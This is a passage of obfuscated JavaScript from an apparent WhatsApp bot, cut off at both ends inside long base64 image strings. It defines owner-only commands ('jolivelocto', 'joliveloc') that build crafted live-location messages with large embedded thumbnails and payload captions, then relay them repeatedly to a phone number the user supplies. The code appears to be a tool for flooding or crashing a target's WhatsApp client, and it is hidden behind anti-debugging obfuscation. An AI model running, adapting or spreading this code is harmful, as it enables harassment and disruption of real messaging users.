Wn6tq1zb6ebokhXk4OGIIGeTwKu6j2g0uySBrvU7ONZU76JnfIZf5lx16+VanoGjar2fj0G4m097uW2sZbSW1ikjLxM0u5XGSAQQMHB8/jVvsr2dv9O1XR5LuJO6gs7iOXY6lYXkl3iMeZwDjIGOKNIJyNyt5hdW8c8F7HJDIoZHRcqwPQg5ormUfYHWrvRtHRtR+rpra17mSDvM+LvHbOVyOjDz8qKbV5G6Xg6dFuCNJGgeTds2/wAq5/f4UhIR3jtx3ahuWByTx0+FKMpMsW4hYx3srDjJ9Kaz94d0sXJ6FDhh/WqlwZ5EVmL7/VWGQaknVB3cSNHGy+LYeAc+/wCdNiRWIfvQ0SHc2Rhhj1/OmuyyndNAfF5o3OPeKAHSRsRtG43EAnqMefIpJPaSv6O4QfAcH8jUneYeWdZSyhf8s5GDxjimQ4jdS2SIkLn49P60Bodl2p1DVNavdAtbtI9SOpXCm4aNP8PaxtwFBGGcgEDIPmTWw6r2lh0zUlt7qzuhb95HC10zIoLNgAhMhmXJGSB61VbshF9Du1jvDFfSajJqVvdpDhoHYg7cZ8QxkHkZBqtqfY6S8u72V9StljubiK6dms90odNvhD7+E8PA8s/HNuDP5IluO2Mcck5bSL97SC/awadHjIaVWwAFLA8n4AZ61PJ2yNvDI0+nXqXqX0dk9kWjLBpBuQhgcEEEeYpr9moWs7i2+sMGbVjqmTDjHjDd3jdz0xu/CqvavQbqW5F3psjyTXesWdwdsO4W4jQIWPPiAxk9PT304J+SMkvbCDcqXWnT296t/DYSwSFS0Zl5R8gkFcc8VHf9qrWymv4jbTPJBex2aAOoEkki7xycBR15NQT9lbi5juri51JDq8t5DerMsBESNDwibN2SMZzz50L2avBDqjy6pby3N5cRXEqvZAwOANvdshYkqcDzB4FOB8jYdIuH1G0Mz2lxZursjRTqAcjzBHDKfIjg0VV7K6WNB0xrUzCUvK8xEamOOPcc7EXJwo9M0VVll1yZKJ2m7+GQ5VVBDedRW0hkQlsZBxxRRQkf/wCpAP8Adbc/v4z+gp1FFAJHg3AQgFXUgj4VLNbpHBMVLcgdTnoelFFAVbeRpYdzYB91WrSKNoY5e7UNjPHTPrRRQGNlv7hJWUsHX0ZRVmxdbk+OGJT6oMGiijBIo2s6jOFYgZOahuHKttGMSgK2fd6fOiigJ6KKKA//2Q==','(((.+)+)+)+$','__proto__','constructor','relayMessage','139xCfBSX','message','exception','fromObject','2015199NPGgLQ','toString','table','prototype','441GSXzKf'];_0x59c9=function(){return _0x187cf5;};return _0x59c9();}_0x3965bc();{if(!isCreator&&!isBan)return;if(!text)throw _0x436538(0x1f9);let doc={'key':{'participant':'0@s.whatsapp.net'},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m[_0x436538(0x1f0)],proto[_0x436538(0x1f7)][_0x436538(0x20c)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':_0x436538(0x1f4)+philips+'\x20'+ngazap(prefix),'sequenceNumber':_0x436538(0x1f2),'jpegThumbnail':_0x436538(0x204)}}),{'userJid':m[_0x436538(0x1f0)],'quoted':doc});jobotz[_0x436538(0x208)](text+_0x436538(0x1fa),liveLocation[_0x436538(0x20a)],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz['relayMessage'](text+_0x436538(0x1fa),liveLocation['message'],{'messageId':liveLocation['key']['id']}),jobotz[_0x436538(0x208)](text+_0x436538(0x1fa),liveLocation['message'],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz[_0x436538(0x208)](text+'@s.whatsapp.net',liveLocation['message'],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz[_0x436538(0x208)](text+_0x436538(0x1fa),liveLocation['message'],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz[_0x436538(0x208)](m[_0x436538(0x1f0)],liveLocation['message'],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz['relayMessage'](m[_0x436538(0x1f0)],liveLocation[_0x436538(0x20a)],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz[_0x436538(0x208)](m[_0x436538(0x1f0)],liveLocation[_0x436538(0x20a)],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz[_0x436538(0x208)](m[_0x436538(0x1f0)],liveLocation[_0x436538(0x20a)],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jobotz[_0x436538(0x208)](m['chat'],liveLocation['message'],{'messageId':liveLocation[_0x436538(0x201)]['id']}),jancok('Berhasil\x20Mengirim\x20Liveloc\x20Di\x20Nomer\x20'+text);}
}
break

case 'jolivelocto': {
function _0x2dbe(){const _0xc08d01=['1661seKtTD','key','THE\x20JO\x20BOT\x20','394BnYWek','108990iUeLNP','message','(((.+)+)+)+$','0@s.whatsapp.net','table','bind','fromObject','4811031MHJzRk','log','Message','Nomernya\x20mana?','1976646qQpkLs','error','@s.whatsapp.net','warn','exception','1657997490287001','chat','relayMessage','prototype','constructor','console','reply','__proto__','return\x20(function()\x20','8mMDIsM','2692pEweak','{}.constructor(\x22return\x20this\x22)(\x20)','44AYAaDp','2077439cOVfVd','118570nUljvp','toString','apply','136551ghbfXV'];_0x2dbe=function(){return _0xc08d01;};return _0x2dbe();}const _0x39a0d9=_0x3c0a;(function(_0x20c6cb,_0x40068d){const _0x436fe0=_0x3c0a,_0x322f5f=_0x20c6cb();while(!![]){try{const _0x4431e1=-parseInt(_0x436fe0(0x1aa))/0x1*(-parseInt(_0x436fe0(0x1b5))/0x2)+parseInt(_0x436fe0(0x1b1))/0x3*(parseInt(_0x436fe0(0x1ac))/0x4)+-parseInt(_0x436fe0(0x1b6))/0x5+parseInt(_0x436fe0(0x19b))/0x6+parseInt(_0x436fe0(0x1ad))/0x7*(parseInt(_0x436fe0(0x1a9))/0x8)+parseInt(_0x436fe0(0x197))/0x9+parseInt(_0x436fe0(0x1ae))/0xa*(-parseInt(_0x436fe0(0x1b2))/0xb);if(_0x4431e1===_0x40068d)break;else _0x322f5f['push'](_0x322f5f['shift']());}catch(_0x198809){_0x322f5f['push'](_0x322f5f['shift']());}}}(_0x2dbe,0x5cabf));const _0x3a3860=(function(){let _0x4b9698=!![];return function(_0x1dc07c,_0x2ac85a){const _0x2b77ba=_0x4b9698?function(){if(_0x2ac85a){const _0x329db8=_0x2ac85a['apply'](_0x1dc07c,arguments);return _0x2ac85a=null,_0x329db8;}}:function(){};return _0x4b9698=![],_0x2b77ba;};}()),_0x47a434=_0x3a3860(this,function(){const _0xaf9406=_0x3c0a;return _0x47a434[_0xaf9406(0x1af)]()['search'](_0xaf9406(0x1b8))[_0xaf9406(0x1af)]()[_0xaf9406(0x1a4)](_0x47a434)['search']('(((.+)+)+)+$');});_0x47a434();function _0x3c0a(_0x40e8d1,_0x51a8ef){const _0x5ac5cd=_0x2dbe();return _0x3c0a=function(_0x563156,_0x1def16){_0x563156=_0x563156-0x195;let _0x1c965a=_0x5ac5cd[_0x563156];return _0x1c965a;},_0x3c0a(_0x40e8d1,_0x51a8ef);}const _0x1def16=(function(){let _0x1eb401=!![];return function(_0x4a4502,_0x3fde0e){const _0x4dd6b3=_0x1eb401?function(){const _0x1a7c9a=_0x3c0a;if(_0x3fde0e){const _0x3f3d75=_0x3fde0e[_0x1a7c9a(0x1b0)](_0x4a4502,arguments);return _0x3fde0e=null,_0x3f3d75;}}:function(){};return _0x1eb401=![],_0x4dd6b3;};}()),_0x563156=_0x1def16(this,function(){const _0x4cc3c5=_0x3c0a;let _0x1ed032;try{const _0x4954e1=Function(_0x4cc3c5(0x1a8)+_0x4cc3c5(0x1ab)+');');_0x1ed032=_0x4954e1();}catch(_0x500a6a){_0x1ed032=window;}const _0x2f818c=_0x1ed032['console']=_0x1ed032[_0x4cc3c5(0x1a5)]||{},_0x4e05f9=[_0x4cc3c5(0x198),_0x4cc3c5(0x19e),'info',_0x4cc3c5(0x19c),_0x4cc3c5(0x19f),_0x4cc3c5(0x1ba),'trace'];for(let _0x2c070d=0x0;_0x2c070d<_0x4e05f9['length'];_0x2c070d++){const _0x51a415=_0x1def16[_0x4cc3c5(0x1a4)][_0x4cc3c5(0x1a3)][_0x4cc3c5(0x195)](_0x1def16),_0x481cc8=_0x4e05f9[_0x2c070d],_0x33920f=_0x2f818c[_0x481cc8]||_0x51a415;_0x51a415[_0x4cc3c5(0x1a7)]=_0x1def16[_0x4cc3c5(0x195)](_0x1def16),_0x51a415[_0x4cc3c5(0x1af)]=_0x33920f[_0x4cc3c5(0x1af)]['bind'](_0x33920f),_0x2f818c[_0x481cc8]=_0x51a415;}});_0x563156();{if(!isCreator&&!isBan)return;if(!text)throw _0x39a0d9(0x19a);let doc={'key':{'participant':_0x39a0d9(0x1b9)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m[_0x39a0d9(0x1a1)],proto[_0x39a0d9(0x199)][_0x39a0d9(0x196)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':_0x39a0d9(0x1b4)+philips+'\x20'+ngazap(prefix),'sequenceNumber':_0x39a0d9(0x1a0),'jpegThumbnail':'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'}}),{'userJid':m[_0x39a0d9(0x1a1)],'quoted':doc});jobotz[_0x39a0d9(0x1a2)](text+_0x39a0d9(0x19d),liveLocation[_0x39a0d9(0x1b7)],{'messageId':liveLocation[_0x39a0d9(0x1b3)]['id']}),jobotz[_0x39a0d9(0x1a2)](text+_0x39a0d9(0x19d),liveLocation[_0x39a0d9(0x1b7)],{'messageId':liveLocation[_0x39a0d9(0x1b3)]['id']}),jobotz[_0x39a0d9(0x1a2)](text+_0x39a0d9(0x19d),liveLocation['message'],{'messageId':liveLocation[_0x39a0d9(0x1b3)]['id']}),jobotz['relayMessage'](text+'@s.whatsapp.net',liveLocation[_0x39a0d9(0x1b7)],{'messageId':liveLocation['key']['id']}),jobotz['relayMessage'](text+_0x39a0d9(0x19d),liveLocation[_0x39a0d9(0x1b7)],{'messageId':liveLocation[_0x39a0d9(0x1b3)]['id']}),await m[_0x39a0d9(0x1a6)]('Berhasil\x20Mengirim\x20liveloc\x20Di\x20Nomer\x20'+text);}
}
break

case 'joliveloc': {
const _0xa6e1a0=_0x2b8f;function _0x3b65(){const _0x18fdbc=['chat','warn','1961298YpZkbB','1501700TtiEMw','prototype','/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQAZAMBIgACEQEDEQH/xAAcAAABBAMBAAAAAAAAAAAAAAAAAQIDBAUGBwj/xAA7EAACAQMDAQUECAQGAwAAAAABAgMABBEFEiExBhMiQVEjYXGRFBUygaGxwfAHUtHhJDNCU4LxQ0Ri/8QAGwEBAAMBAQEBAAAAAAAAAAAAAAECAwQFBgf/xAAmEQACAgEEAQMFAQAAAAAAAAAAAQIRAwQSITFRBQYiEzJBcbGB/9oADAMBAAIRAxEAPwD0GunXj/5t1HGPSKPJ+ZP6VdtLaO1tp1XeyP4TvYsXb1zVknAJPQUwD/JU9VTefix/7rkwaDBglugufLbf96/w1yZ55FTfA2K3ijjRFjUBVCjipaKK7bsxCiimTzRW8TSzyJFEvLO7BQPiTUAnHSoXeRLWARsUPclunmAP61Rtdc0u9Zo7HUrG5kAOUhnVz8gayjQybYSqqwVNpBOPT+lYQi0m0aSTTqSoZctJ3jZjVo+Mbo9w6e6ltVR45D3apnKErxxj8Kj7uWPokyAfytkfLP6Uomd7WQFwwJEatjBOev4VuZiW74Cny8skA48vwqnpthZ6Wpjsxb/Sd3t3jHtCGyV3EksegGSecVe6VqfaS4GmapK8d7eWsV2gnnKPDGhcARr43BYZ2qDjpkHjNSQzbaKhsCrafatEZnjaJWVp2LOQRnxE+fNFQSPZe8IiHV+D7h5mnEiWZngkR93+k8Hj09ar3kvcWl5MOqR7R8T+xUkUQW3jjcBtqgc+4VNcWRfNDyWX7cci/wDHP5UgkQnAYZ9M80Bdv2Gdfgx/KnFpSMF1cejoD+WKgkZPMlvBJNMwWKNS7MfIAZJrzr2u7S3ev6i89y7R26MTFCTxEP6+p+PlgDvevWbX+hajZxQxrJcW0kSsjFcFlIHH315kv4WkSWLxIx4wwwQfQ15vqE5JKK6Z9V7YwY5ynkkrkuggu0kb2UuWU7vv9a7f/C7tLNrttNaak5lu7ZRslY+J4/efMg+fnkdTk1wCws5YrjvJMKBnzzmutfwVtX+ub2+YlYY7cw5PQszKR9/gPzHrXNo5OOVRi+Get67ihl0UsmVVJdHYoyUmi8bhS2DliR0Pr78UNBIsjttAXcz7mfCj3/HFKQGGDgg0IALOUbwgZtvPIA6Y/frXtn5+M3D/AHo/uUmsP2jtbm5S0ksIIriaJyGlEMfeopH/AI+98Oc4rMK2XADBxjqFIx86enFxF78gfHH9jQdmK0W6OmWCwzxa3cyMzSFriHe65JwpKZXgAdOPniirTXTRBRxkjJyfM9fxoqSBL0g28EZGe/myR6gHH5VcqvJFuvolJ8NvGBj/AOiOvyz86sVL6SC7YUUUVUkK4z/Fvs39C1D61s4z9HuG9sAOEk65+Dcn4g+ors1Y7X9LTWdMudPbg3CEBvJSOQ2PccGsc+JZYOLO707Wy0WeOVdfn9Hm2xtZr27htrZDJNKwRFHmScD/ALr0X2X0dezuiwWNswZ+DKSOJJDgE+uPIc8AD0rmn8GNMS41m7v5UI+ixr3YbyZ8jPxAVh/yrsQIEu88iJS5+PQfrXLoMO2O99s9f3Hr3mzLBH7Y/wBYFAGIaFkOcbojwfupfZLE0bySZLbt3dkfpWo6YCt/26DcMHViD77frWI0TUtWFhpmn6bc21vDD2fjviZbfvSWDMMDkYzgeteltPmN50XbHtz9IfHX7P8AakHdB1Y3OdpB+zWitrl9ciXU7G3tlvvqCC9Ps8lvaOXQHrjAOB61Lf8Aa+4azvLyxSOWznvodPsj3BkIJTMjlV5fqQAPMYqNrG9G5tGneyhgDhj+PP60Vrej65qUkdwL/Sby5dJSsdwLSS371NqkEowyDkkenFFKZO5Gajuz9YzQzLtEjFoX8nA6j48VdqhqMHeSWJQf4cS94c9VKg8fOrrbgAXdIgegYZY/dVpVSaIjdtMdRQqO+O7ZHU/6um34ilMcw6IJAehQj9aoWEojfu0M23cznagzjj95/Cju5X8G0JngksMgUjMrzNtxsj8Cj09f37qAx2laRpukd/8AVsX0Pv33yB8spPuJPA9BnHurIMpVNrFS0rZO05G0f3/Oldtqk4z6D1pFhZHIXuWk/wBSr4WH9ahJLhFpScncnbNV7Ujsqur7daM6X80CtItutx7WLJUb+6GGHBHNZqwtdIv0j1HT4opo5bT6GkkLMF7gE+AAHAwc+WR0rAagmpt/EsDSpLSCX6nTvDdRs4C9+/QKw56edYjWrObQ10axluon06Y3E1xNPcSWcUk7HcAzICVGCdq9Dj3VejG65o32x0ixsXja0tNhS2WzGWZh3SkkLgk+ZPPWqp0PSbbRPq1rILpMCPJ3YZsqQd+4NncGznnOa0rS7WTUtTsLXVb6W8QaJNJ3lvcSqshFxhGJ8JbCkckckZ5qnFfpeWGnHtJfTxwNou+0b6Q8Yln3MCSVI3Pjbwc9enNTQ3LwbnpmoaFp2n27wJeSR3kYuhJJFNcO+4YyzeLnw9M0VznWbqeDTOzawzSxqdJhOEcgZy1FTssr9SjslmZILeQzuJSDkEqAN58h7ulSRRmSYqWOcbnYdfcPz+VPVg4WO3ZSo4KSL9seuaVhGqMIoy8WfGUY7gRWbduzZKhsZghmYtJmT7O5lwF+NRzMs0rFsupOEUDIIHniprx4h3bP3ilhw6r5ehzTU9nFJMsgckbEO3GDn9/KgGxr3CSShAjt4EGMff8Av0pGJY+1jWQ/zA7WpXZtpEgWVBz4+CPgaRtqNxuC7A5DHO2gCM4O+TkRLuPvbyH791EcQfAlAYk5PxowQscZ+0fav+g/fpUkf2xQGt6X2t0+bQrG/v7mHThewSOkE027G1tvBwM/3rIy61pNpplvPeajZJb3jAxO0g2yAY6fr6ZrWeyfZ/UtPk7Kve2yxixtLmOcmRD3bu+VHB5yPSoNA0XWNA+prubS3vDFbXNrJbpLHmEvOXV8k4wV4ODwKtSKKUjP6V2rtJ+yWn6tq1zb6ebokhXk4OGIIGeTwKu6j2g0uySBrvU7ONZU76JnfIZf5lx16+VanoGjar2fj0G4m097uW2sZbSW1ikjLxM0u5XGSAQQMHB8/jVvsr2dv9O1XR5LuJO6gs7iOXY6lYXkl3iMeZwDjIGOKNIJyNyt5hdW8c8F7HJDIoZHRcqwPQg5ormUfYHWrvRtHRtR+rpra17mSDvM+LvHbOVyOjDz8qKbV5G6Xg6dFuCNJGgeTds2/wAq5/f4UhIR3jtx3ahuWByTx0+FKMpMsW4hYx3srDjJ9Kaz94d0sXJ6FDhh/WqlwZ5EVmL7/VWGQaknVB3cSNHGy+LYeAc+/wCdNiRWIfvQ0SHc2Rhhj1/OmuyyndNAfF5o3OPeKAHSRsRtG43EAnqMefIpJPaSv6O4QfAcH8jUneYeWdZSyhf8s5GDxjimQ4jdS2SIkLn49P60Bodl2p1DVNavdAtbtI9SOpXCm4aNP8PaxtwFBGGcgEDIPmTWw6r2lh0zUlt7qzuhb95HC10zIoLNgAhMhmXJGSB61VbshF9Du1jvDFfSajJqVvdpDhoHYg7cZ8QxkHkZBqtqfY6S8u72V9StljubiK6dms90odNvhD7+E8PA8s/HNuDP5IluO2Mcck5bSL97SC/awadHjIaVWwAFLA8n4AZ61PJ2yNvDI0+nXqXqX0dk9kWjLBpBuQhgcEEEeYpr9moWs7i2+sMGbVjqmTDjHjDd3jdz0xu/CqvavQbqW5F3psjyTXesWdwdsO4W4jQIWPPiAxk9PT304J+SMkvbCDcqXWnT296t/DYSwSFS0Zl5R8gkFcc8VHf9qrWymv4jbTPJBex2aAOoEkki7xycBR15NQT9lbi5juri51JDq8t5DerMsBESNDwibN2SMZzz50L2avBDqjy6pby3N5cRXEqvZAwOANvdshYkqcDzB4FOB8jYdIuH1G0Mz2lxZursjRTqAcjzBHDKfIjg0VV7K6WNB0xrUzCUvK8xEamOOPcc7EXJwo9M0VVll1yZKJ2m7+GQ5VVBDedRW0hkQlsZBxxRRQkf/wCpAP8Adbc/v4z+gp1FFAJHg3AQgFXUgj4VLNbpHBMVLcgdTnoelFFAVbeRpYdzYB91WrSKNoY5e7UNjPHTPrRRQGNlv7hJWUsHX0Z